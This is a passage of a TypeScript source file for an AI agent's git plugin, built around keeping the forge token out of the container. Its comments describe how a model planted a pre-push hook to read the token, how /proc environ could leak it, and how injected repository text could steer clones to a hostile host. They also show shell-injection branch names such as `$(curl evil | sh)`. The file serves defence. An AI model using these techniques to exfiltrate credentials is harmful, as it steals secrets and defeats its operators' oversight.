import { tool } from "ai";
import type { ToolSet } from "ai";
import { z } from "zod";
import { definePlugin } from "@loopingai/core";
import type { AgentPlugin } from "@loopingai/core";
import {
  DEFAULT_ALLOWED_HOSTS,
  parseRepo,
  repoLocation,
  PROTECTED_BRANCHES,
  UNSAFE_BRANCH
} from "./url.js";
import { refreshCheckout, resolveDefaultBranch } from "./checkout.js";

/**
 * The URL and branch-name parsing, re-exported from the one entry point.
 *
 * `parseRepo` is a host's own tool for deriving a per-repository workspace name
 * from a clone URL — the README tells it to — so it stays on the subpath even
 * though it now lives in `url.ts`.
 */
export { parseRepo } from "./url.js";

/**
 * `@loopingai/plugins/repo` — clone, commit, push, open a pull request.
 *
 * Layered over a container rather than owning one: it needs a shell with `git`
 * on it, and `@loopingai/plugins/computer` already provides exactly that through
 * `computerExec`. Passing `exec` in rather than importing that plugin keeps the
 * two independent — a host with its own container can use this against that
 * instead, and the tests here need no container at all.
 *
 * That seam has already paid for itself twice: when the coder's substrate moved
 * from `@cloudflare/sandbox` to `@cloudflare/computer`, and again when the
 * credentialed half of this plugin moved out of the container entirely.
 *
 * ## Where the token lives
 *
 * Not in the container. Not for a moment, not in one command, not in one
 * process's environment. That single sentence replaced four rules and about
 * three hundred lines, and the history is worth keeping because it is the reason
 * the sentence is worded so absolutely.
 *
 * **What went wrong.** Git is itself a general-purpose command runner: it
 * executes whatever `.git/config` and `.git/hooks` name, and both live in the
 * workspace filesystem, which outlives the container and which a co-installed
 * shell tool can write. So a model never needed the token on *its* command — it
 * planted a `pre-push` hook and waited for `repo_push` to run it, and the hook
 * read `$REPO_TOKEN` out of the environment it inherited. Demonstrated against
 * real git, not theorised.
 *
 * **What was tried.** Patching that key by key does not work: `-c` loses to a
 * URL-specific `http.<url>.sslVerify=false` in the repository's own config,
 * because specificity outranks precedence. So credentialed commands moved into a
 * bare git dir created per operation, built, configured and used inside one
 * shell command, reaching the checkout's objects through an alternates file. It
 * worked. It also left a residual nobody could close from inside the container:
 * for the length of one command the token sat in a process's environment on a
 * filesystem the model had root on, and `/proc/<pid>/environ` needs no git at
 * all.
 *
 * **What is true now.** The three operations that need a credential — clone,
 * fetch, push — are not run here. They go to {@link RepoConfig.git}, which the
 * host implements on its own side of the boundary, and the container never sees
 * them. The coder in `looping-starter` runs isomorphic-git inside the Durable
 * Object that owns the workspace filesystem: same files, no shell, no hooks, no
 * `ext::` transport, no template directory, no credential helpers. There is
 * nothing to plant and no environment to read.
 *
 * Everything else — `status`, `diff`, `add`, `commit`, `checkout` — still runs
 * in the container through {@link RepoConfig.exec}, because none of it needs to
 * authenticate. That is the whole split, and it is the one thing to preserve
 * when changing this file: if an operation talks to the forge it does not belong
 * on `exec`, and if it does not, it has no business anywhere else.
 *
 * Two rules survive the move, because they were never about the container:
 *
 * 1. **The forge is an allowlist, checked before anything runs.** A clone URL is
 *    model input — a repository README, an issue body, or a page fetched by a
 *    co-installed browser plugin is enough to choose it — and a credential
 *    offered to a host of the model's choosing is the whole game. So the URL's
 *    host must be on {@link RepoConfig.allowedHosts} before any operation
 *    starts, and the allowlist travels with each call so the host can bind the
 *    check to the moment the token would actually be handed over. `origin` is
 *    re-derived and re-checked on every push rather than remembered, because the
 *    checkout's `.git/config` is a file the container can rewrite.
 * 2. **Pull requests are opened from the Worker.** The REST call happens on this
 *    side, so the credential that can write to the repository through the API
 *    never crosses the boundary either.
 *
 * Model-authored values — URLs, branch names, commit messages — still travel to
 * the container as environment variables rather than being interpolated into a
 * command, so a branch name of `$(curl evil | sh)` is inert text. That is about
 * shell injection, not credentials, and it is unaffected by any of the above.
 *
 * A separate limit, and not one this plugin can close: the allowlist bounds the
 * *host*, never the repository. Whatever the token can reach, an agent talked
 * into naming it can reach. See the README — the token wants to be fine-grained.
 */

/** This plugin's tool-family name, as a recipe's `toolFamilies` lists it. */
export const REPO_FAMILY = "repo";

/** Run one command in the host's container. Matches `computerExec`'s shape. */
export type RepoExec = (
  command: string,
  options?: {
    cwd?: string;
    env?: Record<string, string | undefined>;
    timeout?: number;
    /**
     * The executing subtask's runtime state, forwarded **opaquely**.
     *
     * This plugin never looks inside it. A delegated subtask has to reach the
     * container its parent prepared, and the key for that lives in the runtime
     * state the parent resolved — but decoding it is the container plugin's
     * business, not git's. Passing it through untouched is what lets the two
     * plugins compose
     * without either importing the other, which is the whole reason `exec` is
     * injected rather than imported.
     */
    runtime?: unknown;
  }
) => Promise<{
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number;
}>;

/**
 * The three git operations that need the forge token, run by the host.
 *
 * Injected for the same reason {@link RepoExec} is — this plugin owns the
 * policy, not the plumbing — but the split between the two is not arbitrary. It
 * is the trust boundary. Everything reachable through `exec` runs in the
 * container and gets **no credential**; everything here runs wherever the host
 * keeps its secret and never touches the container at all.
 *
 * That is why `clone`, `fetch` and `push` are the whole interface. They are
 * exactly the operations that talk to the forge. `status`, `diff`, `add`,
 * `commit` and `checkout` are local, need nothing to authenticate with, and stay
 * on `exec` where they are cheap and where the model can see them work.
 *
 * A host implements this against whatever git it has on its own side of the
 * boundary. The coder in `looping-starter` runs isomorphic-git inside the
 * Durable Object that owns the workspace filesystem, so a push reads the token
 * from that object's environment and the container never holds one.
 *
 * ## Failures arrive as values
 *
 * No method here rejects for a git failure. A remote that refuses a push, a
 * branch that does not resolve, a repository that is not there — all of it comes
 * back as `ok: false`, because those are answers. A rejection means the host
 * itself could not be reached, which is a different fact and gets a different
 * sentence from every tool in this file. See {@link RunResult}.
 */
export interface RepoGit {
  /**
   * Put a checkout at `dir`, on `branch` or the remote's default.
   *
   * `detail` is the branch it landed on — the caller cannot know it in advance
   * when `branch` is omitted, and asking git afterwards would be a second round
   * trip for something the clone already had in its hand.
   */
  clone(req: {
    url: string;
    dir: string;
    allowedHosts: string[];
    branch?: string;
    depth?: number;
  }): Promise<RepoGitResult>;
  /** Update remote-tracking refs for the checkout at `dir`. */
  fetch(req: {
    url: string;
    dir: string;
    allowedHosts: string[];
    depth?: number;
  }): Promise<RepoGitResult>;
  /**
   * Push `branch` to the same-named branch on the remote.
   *
   * Never a force push and never a refspec: the caller has already refused
   * anything that is not a plain branch name, and this signature is the other
   * half of that promise — there is no parameter here with which to ask for one.
   */
  push(req: {
    url: string;
    dir: string;
    branch: string;
    allowedHosts: string[];
  }): Promise<RepoGitResult>;
}

/** What a {@link RepoGit} operation reports. */
export type RepoGitResult =
  { ok: true; detail: string } | { ok: false; code?: string; message: string };

export interface RepoConfig {
  /**
   * Runs commands in the container holding the checkout.
   *
   * Uncredentialed, always. Nothing this runs is ever given the forge token —
   * see {@link RepoGit} for the operations that need one.
   */
  exec: RepoExec;
  /** Runs the three credentialed operations, on the host's side of the boundary. */
  git: RepoGit;
  /**
   * A forge token with contents+pull-request write. A thunk so a rotated secret
   * is picked up without rebuilding the plugin list.
   */
  token: () => string;
  /** Where clones land. Defaults to `/workspace`. */
  workdir?: string;
  /** API origin, for GitHub Enterprise. Defaults to the public API. */
  apiBase?: string;
  /** Committer identity. Defaults to a generic agent identity. */
  author?: { name: string; email: string };
  /**
   * Hosts a clone may target, lowercase and exact. Defaults to `github.com`.
   *
   * A fail-closed allowlist rather than a blocklist, because the failure it
   * prevents is credential exfiltration and the input is model-chosen. Widen it
   * for GitHub Enterprise (alongside `apiBase`); an empty array clones nothing.
   */
  allowedHosts?: string[];
  /**
   * Ceiling on what any one tool here returns to the model, in **characters**.
   * Defaults to 16,000, matching the computer plugin.
   *
   * Characters, not bytes, and the field was renamed to say so: `truncateOutput`
   * budgets with `String.length`, so a diff of 16,000 non-ASCII characters was
   * three times the "byte" limit this used to advertise.
   *
   * This is not tidiness. `repo_diff` is the main input for an agent that
   * reviews rather than writes — a delegating coder whose subagents hold the
   * shell — and an unbounded diff on a large change is precisely the context
   * blowup that design exists to prevent.
   */
  maxOutputChars?: number;
  /**
   * Called after a checkout is in place, freshly cloned or refreshed onto a new
   * commit.
   *
   * The hook exists because "there is now a working tree at this path" is
   * knowledge only this plugin has, and "that tree needs its dependencies
   * installed" is a decision only the host can make. Keeping the two apart is
   * what stops a git plugin growing an opinion about npm — the host wires this
   * to whatever its runtime does, or leaves it unset and nothing changes.
   *
   * Awaited, so it can record intent durably, but it must **return quickly**:
   * it runs inside `repo_clone`, which runs inside a model turn. A host that
   * wants to install here should start a job and return, not wait for it.
   *
   * A throw is caught and logged rather than failing the clone. The checkout did
   * succeed, the model needs to be told so, and a follow-up that did not is the
   * host's to notice.
   */
  afterCheckout?: (checkout: RepoCheckout) => Promise<void>;
  /**
   * Called with the repository a clone is *about* to target, after the host
   * allowlist has passed and before any git runs.
   *
   * Separate from {@link afterCheckout} because it answers a different question,
   * and the ordering is the whole point. A host that keys its container or its
   * filesystem per repository has to know which one **before** the clone, or the
   * clone lands somewhere it will then have to be moved from. `afterCheckout`
   * is far too late for that: by then the files exist.
   *
   * Synchronous on purpose. It runs on the path of every clone and the only
   * sensible thing to do with it is record a selection, which is why it returns
   * nothing and cannot be awaited — a host that needs to do I/O here has the
   * ordering wrong.
   *
   * A throw **fails the clone**, unlike {@link RepoConfig.afterCheckout}, whose
   * throw is caught and logged. A host that cannot choose a workspace has not
   * chosen one, and cloning into whichever was already open is worse than not
   * cloning.
   */
  beforeCheckout?: (target: {
    url: string;
    host: string;
    owner: string;
    repo: string;
  }) => void;
}

/** What {@link RepoConfig.afterCheckout} is told about a checkout. */
export interface RepoCheckout {
  /** Absolute path of the working tree. */
  dir: string;
  /** The clone URL, already allowlist-checked. */
  url: string;
  /** Host it came from, lowercase. */
  host: string;
  /**
   * `owner/repo`.
   *
   * Always present: a URL that does not parse into one is refused before any git
   * runs, so a host keying anything per repository can rely on this rather than
   * inventing a fallback for a case that no longer reaches it.
   */
  repo: string;
  /** Branch the checkout is on. */
  branch: string;
  /** True for a first clone, false when an existing tree was refreshed. */
  fresh: boolean;
}

const DEFAULT_WORKDIR = "/workspace";
const DEFAULT_API_BASE = "https://api.github.com";
const DEFAULT_AUTHOR = {
  name: "looping-coder",
  email: "coder@looping.invalid"
};
const DEFAULT_MAX_OUTPUT_CHARS = 16_000;
/**
 * Ceiling on the one call this plugin makes that is not a container command.
 *
 * Not configurable, because it is not a tuning knob: it exists so that an API
 * which stops answering costs a round rather than the task. Opening a pull
 * request is a single small POST, and thirty seconds is already generous for one.
 */
const PR_TIMEOUT_MS = 30_000;

/**
 * Middle-out truncation, so both the head of a diff and its tail survive.
 *
 * Deliberately a **copy** of the computer plugin's function of the same name,
 * not an import. `npm run verify:exports` fails any subpath whose module graph
 * reaches a sibling's directory, and its own advice for a shared helper is to
 * duplicate it — installing `repo` must not drag `computer` (and therefore
 * `@cloudflare/computer`) into a consumer's bundle. Fifteen lines is a cheaper
 * price than that coupling, and it is the same reason `exec` is injected here
 * rather than imported.
 *
 * The `half < 1` guard is not padding: without it a small `max` makes `half`
 * zero or negative, and `slice(-0)` is `slice(0)` — the whole string — so the
 * function would return *more* than it was given.
 */
export function truncateOutput(text: string, max: number): string {
  if (text.length <= max) return text;

  const marker = (dropped: number) =>
    `\n\n… [${dropped} characters omitted from the middle] …\n\n`;

  const half = Math.floor((max - marker(text.length).length) / 2);
  if (half < 1) return text.slice(0, Math.max(0, max));

  return (
    text.slice(0, half) + marker(text.length - half * 2) + text.slice(-half)
  );
}

/**
 * What one container command produced — plus one bit the container did not.
 *
 * `exec` does not only *return* failures, it throws them: `@cloudflare/computer`
 * throws `EEXEC_LOST` when a container is replaced mid-command, and any call to a
 * Durable Object can fail outright. None of that used to be caught anywhere in
 * this file, so it left as a tool error carrying
 * `Execution "…" was lost when its container runtime was replaced` — a sentence
 * whose plausible readings are all wrong and all expensive.
 *
 * It is caught at the seam instead ({@link buildRepoTools}'s `run`) and turned
 * into a failed result, because every tool here already has a `!success` branch
 * that says what it was doing at the time. "could not read the status of /w/r: …"
 * is a better sentence than anything a wrapper one level up could write, and a
 * seventh tool calling `plain` gets it without being told.
 *
 * `unreachable` is for the branches that must tell the two apart. A command that
 * ran and failed has answered the question it was asked; a command that never ran
 * has answered nothing, and three places here read a failure as an answer.
 */
type RunResult = Awaited<ReturnType<RepoExec>> & { unreachable?: true };

/**
 * What to tell the model when the plumbing, not the command, is the problem.
 *
 * A sibling of the computer plugin's `execLostNote` rather than an import, for
 * the same reason {@link truncateOutput} is a copy: `npm run verify:exports`
 * fails any subpath whose module graph reaches a sibling's, and installing `repo`
 * must not drag `computer` in behind it. The wording differs anyway, and the
 * difference is the point — that plugin cannot know the lost command was git, and
 * this one does. What a model needs after a lost `git push` is not "re-run it"
 * but whether re-running it is *safe*.
 */
function unreachableNote(err: unknown): string {
  if ((err as { code?: unknown } | null | undefined)?.code === "EEXEC_LOST") {
    return (
      "the container was replaced while this command was running, so nothing here " +
      "is known to have finished. This is infrastructure — not git, and not what " +
      "you asked for. The checkout is durable and is exactly as you left it. " +
      "Retry, and read what the retry says rather than assuming it starts from " +
      "nothing: a command that had already reached the forge may have taken " +
      "effect. Retrying is safe either way — these commands push one branch to " +
      "the branch of the same name, and never force."
    );
  }
  return (
    `the command could not be run: ${String(err)}. This is the plumbing — the ` +
    `container, the transport to it, or the host's own configuration — rather ` +
    `than git or anything you passed, and nothing is known to have completed. ` +
    `Retry once; if it happens again, say so in your result rather than working ` +
    `around it.`
  );
}

export function buildRepoTools(
  config: RepoConfig,
  /** Forwarded to every `exec`; see {@link RepoExec}'s `runtime` option. */
  runtime?: unknown
): ToolSet {
  const workdir = config.workdir ?? DEFAULT_WORKDIR;
  const apiBase = config.apiBase ?? DEFAULT_API_BASE;
  const author = config.author ?? DEFAULT_AUTHOR;
  const allowedHosts = config.allowedHosts ?? DEFAULT_ALLOWED_HOSTS;
  const maxChars = config.maxOutputChars ?? DEFAULT_MAX_OUTPUT_CHARS;

  /** Everything this plugin hands back to the model, bounded. */
  const bounded = (text: string) => truncateOutput(text, maxChars);

  /**
   * Tell the host a checkout is ready, and never let that fail the clone.
   *
   * The clone did succeed. Whatever the host wanted to do next — start an
   * install, usually — is its problem to notice, and turning a working
   * `repo_clone` into an error would send the model to investigate git when
   * git is fine.
   */
  const notifyCheckout = async (checkout: RepoCheckout): Promise<void> => {
    if (!config.afterCheckout) return;
    try {
      await config.afterCheckout(checkout);
    } catch (err) {
      console.error("[repo] afterCheckout failed", {
        dir: checkout.dir,
        repo: checkout.repo,
        err: String(err)
      });
    }
  };

  /**
   * Say out loud that a git command failed.
   *
   * Every failure path here returns its stderr *to the model* and logged
   * nothing, which is exactly one audience short. When a push started failing
   * in production the only trace was an `exec` line with `exitCode: 128`
   * and a truncated command — diagnosing it meant correlating exit codes
   * against the GitHub API to prove the branch never landed. One line naming
   * the tool and carrying the stderr answers it directly.
   *
   * The token is scrubbed rather than trusted. It has no route into a container
   * command at all any more, and the one channel that could still carry it is
   * the forge API's error body, which {@link forge} logs through this same
   * function. So stderr *should* be clean — but "should be" is not the standard
   * for something that writes a credential into a log that outlives the request,
   * and the cost of being wrong is unbounded while the cost of the scrub is a
   * `split`/`join` on a failure path.
   */
  const logFailure = (
    tool: string,
    detail: { exitCode?: number; stderr?: string; stdout?: string }
  ): void => {
    // Read defensively, because this now runs on the path where the plumbing
    // failed — and a `GITHUB_TOKEN` the host cannot resolve is one of the
    // likelier reasons to be here. A thunk that throws would throw out of the
    // handler written to stop throws escaping, which is the one thing this must
    // never do. Nothing to scrub is not a problem; nothing gets logged either
    // way except what a command produced.
    let token: string;
    try {
      token = config.token();
    } catch {
      token = "";
    }
    const scrub = (text: string | undefined) =>
      token && text ? text.split(token).join("«token»") : text;
    console.warn(`[repo] ${tool} failed`, {
      exitCode: detail.exitCode,
      stderr: truncateOutput(scrub(detail.stderr) ?? "", 2_000),
      stdout: truncateOutput(scrub(detail.stdout) ?? "", 2_000)
    });
  };

  /**
   * One git command at a time, per checkout.
   *
   * Git takes `.git/index.lock` for anything that writes, and fails outright
   * rather than waiting if it is already held. Nothing stopped two of these tools
   * running at once — a model may emit several tool calls in a single turn, and
   * the SDK executes them concurrently — so a `repo_commit` and a `repo_push`
   * issued together raced, and production returned:
   *
   *     fatal: Unable to create '…/.git/index.lock': File exists.
   *     Another git process seems to be running in this repository
   *
   * The commit failed, the push succeeded against the *previous* state, and the
   * model had to work out what had actually landed. A lost commit is the good
   * outcome there; the bad one is a push that looks like it worked.
   *
   * A promise chain rather than a real lock, because that is all the scope needs:
   * the racers are tool calls inside one turn, in one isolate, against one
   * container. It is also deliberately **not** module-level — two agents working
   * on two checkouts have no reason to queue behind each other.
   *
   * Reads are serialised too. `git status` does not take the lock, but ordering
   * them costs nothing on operations measured in tens of milliseconds and removes
   * having to be right about which commands write.
   */
  let gitQueue: Promise<unknown> = Promise.resolve();
  const serialised = <T>(run: () => Promise<T>): Promise<T> => {
    // `then(run, run)` so one failure does not wedge every command behind it —
    // the queue is for ordering, not for propagating outcomes.
    const next = gitQueue.then(run, run);
    gitQueue = next.then(
      () => undefined,
      () => undefined
    );
    return next;
  };

  /**
   * Run git with the token in the environment, never on the command line, and
   * offered only to `host`.
   *
   * `vars` carries every **model-controlled** value — a URL, a branch name, a
   * commit message — into the container as an environment variable, referenced
   * inside the command as `"$VAR"`. Interpolating them into the command string
   * instead would let a model-authored branch name of `x; curl evil | sh` run
   * as a second command. The container is isolated and the blast radius is its
   * own filesystem, but "the container contains it" is a reason to be careful
   * here, not a reason to skip it.
   *
   * `host` is never model input: it comes from {@link repoLocation} after the
   * allowlist check, so the origin the credential is bound to is always one the
   * host configured.
   */
  /**
   * Every container command this plugin runs, and the only place `exec` is
   * allowed to throw.
   *
   * `options` is a thunk rather than a value so that everything it reads — the
   * token above all — is read here, inside the `try` and at the moment the queue
   * actually dequeues this command. Building it at the call site would put a
   * rotated secret's lookup, and any throw from it, outside the one handler.
   */
  const run = (
    command: string,
    options: () => Parameters<RepoExec>[1]
  ): Promise<RunResult> =>
    serialised(async () => {
      try {
        return await config.exec(command, options());
      } catch (err) {
        // Logged here as well as by the tool's own failure branch: the two say
        // different things, and this is the one that names the command. The
        // command string is safe to log — that it never carries the token is the
        // invariant this whole file is built on, and it has a test.
        console.warn("[repo] command could not run", {
          command: truncateOutput(command, 500),
          err: String(err)
        });
        return {
          success: false,
          stdout: "",
          stderr: unreachableNote(err),
          exitCode: -1,
          unreachable: true
        };
      }
    });

  /** A container command with no secret in its environment. */
  const shell = (
    script: string,
    cwd: string,
    vars: Record<string, string> = {}
  ) =>
    run(script, () => ({
      cwd,
      runtime,
      env: { GIT_TERMINAL_PROMPT: "0", ...vars }
    }));

  const plain = (
    args: string,
    cwd: string,
    vars: Record<string, string> = {}
  ) => shell(`git ${args}`, cwd, vars);

  /**
   * Run one credentialed operation, on the host's side of the boundary.
   *
   * The sibling of {@link run}, and it exists for the same reason: every tool
   * below already has a `!success` branch that says what it was doing at the
   * time, and that is a better sentence than any wrapper could write. What
   * differs is where a failure can come from.
   *
   * {@link RepoGit} reports a *git* failure as data — a rejected push, a branch
   * that does not resolve — so that becomes an ordinary unsuccessful result. A
   * throw means the host could not be reached at all, which is the `unreachable`
   * case: nothing ran, and three places in this file read that differently from
   * an answer.
   *
   * Serialised with the container commands rather than merely alongside them. A
   * fetch writes refs into the same checkout a `git status` is reading, and the
   * two interleaving is exactly the race `serialised` exists to prevent — the
   * fact that one of them now runs somewhere else does not change that they
   * share a filesystem.
   */
  const runGit = (op: () => Promise<RepoGitResult>): Promise<RunResult> =>
    serialised(async () => {
      try {
        const result = await op();
        return result.ok
          ? { success: true, stdout: result.detail, stderr: "", exitCode: 0 }
          : { success: false, stdout: "", stderr: result.message, exitCode: 1 };
      } catch (err) {
        // Logged here as well as by the tool's own failure branch, the same way
        // `run` does it: this is the line that names the operation as git's
        // rather than the container's, which is the first thing worth knowing.
        console.warn("[repo] a credentialed git operation could not run", {
          err: String(err)
        });
        return {
          success: false,
          stdout: "",
          stderr: unreachableNote(err),
          exitCode: -1,
          unreachable: true
        };
      }
    });

  /**
   * Update the checkout's remote-tracking refs.
   *
   * The allowlist travels with the call rather than being checked once here,
   * because the host is where the token actually is: it can bind the check to
   * the moment the credential would be handed over, which catches a host reached
   * by redirect as well as one named in the URL.
   */
  const fetchOrigin = (dir: string, url: string) =>
    runGit(() => config.git.fetch({ url, dir, allowedHosts }));

  /** Push one branch to the same-named branch on the remote. Never forced. */
  const pushBranch = (dir: string, url: string, branch: string) =>
    runGit(() => config.git.push({ url, dir, branch, allowedHosts }));

  /**
   * One call to the forge's API, from the Worker.
   *
   * Shares `repo_open_pr`'s shape — same bound, same header set, same refusal to
   * let an unreadable body replace the status that explains a failure — but not
   * its wording. That tool is a POST that may have been received even when the
   * answer never arrived, so it has to say something these do not, and copying
   * its sentence here would be wrong in three places to save duplication in one.
   */
  const forge = async (
    tool: string,
    path: string,
    init?: { method: string; body: unknown }
  ): Promise<{ ok: true; data: unknown } | { ok: false; message: string }> => {
    let response: Response;
    try {
      response = await fetch(`${apiBase}${path}`, {
        method: init?.method ?? "GET",
        headers: {
          authorization: `Bearer ${config.token()}`,
          accept: "application/vnd.github+json",
          "content-type": "application/json",
          "user-agent": "looping-coder"
        },
        ...(init ? { body: JSON.stringify(init.body) } : {}),
        signal: AbortSignal.timeout(PR_TIMEOUT_MS)
      });
    } catch (err) {
      logFailure(tool, { stderr: String(err) });
      return {
        ok: false,
        message: `could not reach ${apiBase}: ${String(err)}`
      };
    }
    if (!response.ok) {
      const detail = await response.text().catch(() => "");
      logFailure(tool, { exitCode: response.status, stderr: detail });
      return {
        ok: false,
        message: `${apiBase}${path} answered ${response.status}: ${detail.slice(0, 500)}`
      };
    }
    return { ok: true, data: await response.json().catch(() => ({})) };
  };

  /**
   * Which repository the tools that read the forge are talking about.
   *
   * The checkout's own origin, never a URL the model supplies. Three reasons, in
   * order of how much they matter: the origin has already been through the host
   * allowlist, there is nothing new to validate; a model that can name any
   * repository here can read any repository the token can, which is precisely
   * the reach this plugin does not want to widen; and an agent asking about
   * "issue 42" almost always means the repository it is working in, so the extra
   * parameter would mostly be an extra way to be wrong.
   */
  const forgeRepo = async (
    dir: string
  ): Promise<{ owner: string; repo: string } | { refusal: string }> => {
    const { remote, unreachable } = await origin(dir);
    if (unreachable) return { refusal: bounded(unreachable) };
    if (!remote)
      return {
        refusal: `${dir} has no origin on an allowed host — clone it with repo_clone first`
      };
    const parsed = parseRepo(remote.url, allowedHosts);
    if (!parsed)
      return {
        refusal: `could not parse an owner/repo out of ${dir}'s origin`
      };
    return {
      owner: encodeURIComponent(parsed.owner),
      repo: encodeURIComponent(parsed.repo)
    };
  };

  /**
   * The origin a checkout was cloned from, re-derived rather than remembered.
   *
   * `repo_push` needs to know which host to offer the credential to, and the
   * only trustworthy answer is the one recorded in the checkout itself — which
   * `repo_clone` only ever writes after the allowlist has passed.
   */
  const origin = async (
    dir: string
  ): Promise<{
    /** Set when the checkout names an origin on an allowed host. */
    remote?: { host: string; url: string };
    /** Set when git never answered, so "no origin" would be a guess. */
    unreachable?: string;
  }> => {
    const result = await plain("remote get-url origin", dir);
    // Two different nothings. `repo_push`'s answer to "no origin here" is to
    // tell the model to clone the repository first — advice that is actively
    // wrong when the truth is that no command ran at all.
    if (result.unreachable) return { unreachable: result.stderr };
    if (!result.success) return {};
    const url = result.stdout.trim();
    const location = repoLocation(url);
    if (!location || !allowedHosts.includes(location.host)) return {};
    // The URL as well as the host: the credentialed operations run on the
    // host's side of the boundary and take the repository as a parameter, so
    // `origin` is a name that means nothing to them. The URL has to travel.
    return { remote: { host: location.host, url } };
  };

  return {
    repo_clone: tool({
      description:
        "Clone a git repository into the workspace. Returns the checkout path and the branch you landed on. If the repository is already checked out from an earlier task, it is fetched and reset to the remote instead — unless it has uncommitted changes, which are left alone for you to inspect.",
      inputSchema: z.object({
        url: z.string().describe("HTTPS repository URL"),
        branch: z
          .string()
          .optional()
          .describe("Branch to check out (default: the repo's default)"),
        depth: z
          .number()
          .optional()
          .describe(
            "Shallow-clone depth. Omit for full history; needed if you must rebase."
          )
      }),
      execute: async ({ url, branch, depth }) => {
        // The gate, before anything runs. `url` is model input, and a clone is
        // the one command that hands a credential to a host it names.
        const location = repoLocation(url);
        if (!location || !allowedHosts.includes(location.host)) {
          return (
            `refusing to clone from "${location?.host ?? url}" — this agent may ` +
            `only clone over https from: ${allowedHosts.join(", ")}`
          );
        }
        const { host } = location;

        // Refused rather than worked around. A URL that passes the host check but
        // names no repository is what a model copies out of a browser —
        // `.../tree/main`, `.../pull/4` — and this used to carry on with a `dir`
        // of `${workdir}/repo` and no `beforeCheckout` at all. A host keying its
        // filesystem per repository therefore never switched, so the clone landed
        // in whichever repository's workspace happened to be active, and the
        // error the model finally saw was git's, about the wrong thing, in the
        // wrong place.
        //
        // Not silently trimmed to the first two segments either, tempting as it
        // is: that also reads `.../orgs/x/repositories` as the repository `x`,
        // and quietly reinterpreting the target is the wrong instinct for the one
        // tool that offers a credential to a host on the model's say-so. A
        // refusal costs one turn and says exactly what to send instead.
        const parsed = parseRepo(url, allowedHosts);
        if (!parsed) {
          return (
            `refusing to clone "${url}" — it does not name a repository. ` +
            `A clone URL is https://<host>/<owner>/<repo>, so if this came out of ` +
            `a browser, drop everything after the repository name (the /tree/…, ` +
            `/pull/… or /blob/… part) and try again.`
          );
        }

        // The same guard `repo_push` applies, at the second door a branch name
        // enters by. `refreshCheckout` runs `git checkout "$REPO_BRANCH"`, and
        // quoting stops word-splitting but *not* option parsing: a `branch` of
        // `--detach` arrives as an option, git detaches HEAD, the `reset` that
        // follows fails against `origin/--detach`, and the checkout a later task
        // inherits has moved for reasons nothing reported.
        //
        // Checked here rather than in `refreshCheckout` because this is where
        // model input arrives and where the message can say what to send instead.
        // It also covers the fresh-clone path, where the name reaches
        // isomorphic-git as a ref: no argv there, so no option to parse, but an
        // unresolvable ref is a worse error than this sentence.
        if (branch !== undefined && UNSAFE_BRANCH.test(branch))
          return `"${branch}" is not a plain branch name — use something like "main"`;

        const dir = `${workdir}/${parsed.repo}`;

        // Before anything runs, and before `dir` is touched: a host keying its
        // filesystem per repository needs to have switched by now. See
        // `beforeCheckout` for why this cannot wait for the clone to finish.
        //
        // A throw here stops the clone, which is the exact opposite of how
        // `afterCheckout` is treated — and the asymmetry is the point rather than
        // an inconsistency. This hook *chooses the workspace*; carrying on past a
        // failed one would put the checkout wherever the last task left the
        // selection, which is the failure the hook exists to prevent. By the time
        // `afterCheckout` runs there is a checkout on disk and the model needs to
        // be told about it, so that one is caught and logged.
        try {
          config.beforeCheckout?.({
            url,
            host,
            owner: parsed.owner,
            repo: parsed.repo
          });
        } catch (err) {
          console.error("[repo] beforeCheckout failed", {
            url,
            repo: `${parsed.owner}/${parsed.repo}`,
            err: String(err)
          });
          return (
            `could not select a workspace for ${parsed.owner}/${parsed.repo}: ` +
            `${String(err)}\nNothing was cloned — going ahead would have put the ` +
            `checkout in whichever workspace was already open.`
          );
        }

        // The workspace outlives the task, so this path may already hold the
        // checkout a previous task left — see `refreshCheckout`.
        const existing = await plain("rev-parse --git-dir", dir);
        // A failed probe means "nothing here, clone it" — but only when git
        // answered. A command that never ran means nothing, and the distinction
        // is not academic: a replaced container is precisely the case where this
        // call fails and the *next* one lands on a working replacement. Read as
        // "empty", it points `git clone` at a directory that already holds the
        // checkout — which fails with `destination path already exists` and skips
        // the refresh that was the right answer all along.
        if (existing.unreachable)
          return bounded(`could not clone ${url}: ${existing.stderr}`);
        if (existing.success) {
          const refreshed = await refreshCheckout({
            dir,
            url,
            branch,
            plain,
            fetchOrigin
          });
          if (refreshed.branch) {
            await notifyCheckout({
              dir,
              url,
              host,
              repo: `${parsed.owner}/${parsed.repo}`,
              branch: refreshed.branch,
              fresh: false
            });
          }
          return refreshed.message;
        }

        // `depth` is bounded here rather than trusted from the schema. It no
        // longer reaches a shell, so this is arithmetic rather than quoting: a
        // fractional or negative depth is not something to hand to git.
        const result = await runGit(() =>
          config.git.clone({
            url,
            dir,
            allowedHosts,
            ...(branch ? { branch } : {}),
            ...(depth ? { depth: Math.max(1, Math.floor(depth)) } : {})
          })
        );
        if (!result.success) {
          logFailure("repo_clone", result);
          return bounded(`clone failed: ${result.stderr || result.stdout}`);
        }

        // Identity has to exist before the first commit, and a repo-local config
        // keeps it from leaking into anything else in the container.
        //
        // Still written through the container, and deliberately: the commits it
        // names are made there, by `repo_commit`, with no credential in sight.
        // Only the three operations that talk to the forge moved.
        await plain(`config user.name "$GIT_NAME"`, dir, {
          GIT_NAME: author.name
        });
        await plain(`config user.email "$GIT_EMAIL"`, dir, {
          GIT_EMAIL: author.email
        });

        // Two gits now share one `.git`, and this is where they could disagree.
        //
        // The container's git and the host's isomorphic-git read and write the
        // same index. isomorphic-git understands version 2 and the extensions
        // git writes for its own caches are not part of that contract, so a
        // repository that picked up an untracked cache or a split index — from a
        // `feature.manyFiles` default, or a user config in some future image —
        // would be written by one and misread by the other. Pinned at clone
        // time, repo-locally, where it costs three commands and cannot surprise
        // anyone later.
        //
        // Unchecked deliberately, like the upstream-tracking pair in
        // `repo_push`: git's own defaults are already these values, so a failure
        // here means the config could not be written at all, which the very next
        // command will say far more clearly than this one could.
        await plain(`config index.version 2`, dir);
        await plain(`config core.untrackedCache false`, dir);
        await plain(`config core.splitIndex false`, dir);

        // The clone reports the branch it landed on, so nothing has to ask git
        // afterwards. That used to be a `rev-parse --abbrev-ref HEAD` whose
        // failure produced "on branch " and fired `afterCheckout` with no branch
        // at all, starting an install against a checkout nobody could name.
        const landed = result.stdout.trim() || branch;
        if (!landed) {
          logFailure("repo_clone", result);
          return bounded(
            `cloned to ${dir}, but could not read which branch it landed on`
          );
        }
        await notifyCheckout({
          dir,
          url,
          host,
